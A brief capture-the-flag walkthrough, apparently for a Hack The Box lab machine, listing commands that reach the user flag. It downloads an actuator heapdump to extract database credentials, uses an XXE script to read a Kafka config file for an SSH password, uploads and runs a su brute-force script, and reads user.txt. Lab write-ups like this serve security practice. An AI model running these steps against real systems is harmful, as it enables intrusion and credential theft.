# User Flag — Stream

## 1. Heap → ClickHouse creds
curl -s -o heap.hprof http://api.htb-airport.htb/actuator/heapdump
python3 scripts/heap_extract.py heap.hprof
# → svc_events / <CH_PASS>

## 2. In-band XXE → Kafka server.properties
python3 scripts/xxe_read.py --target 10.129.15.255 \
  --file /opt/kafka_2.13-4.3.1/config/server.properties \
  --flight K1 -u svc_events -p "$CH_PASS"
# → user_svc_infra="<KAFKA_PASS>"   ← SSH password

## 3. SSH svc-infra → local su brute
sshpass -p '<KAFKA_PASS>' scp scripts/su_brute.py /tmp/ry200.txt svc-infra@10.129.15.255:/dev/shm/
ssh svc-infra@10.129.15.255 'python3 /dev/shm/su_brute.py martin_cole /dev/shm/ry200.txt'
# → [+] HIT martin_cole : tinkerbell

## 4. user.txt
ssh martin_cole@10.129.15.255 'cat ~/user.txt'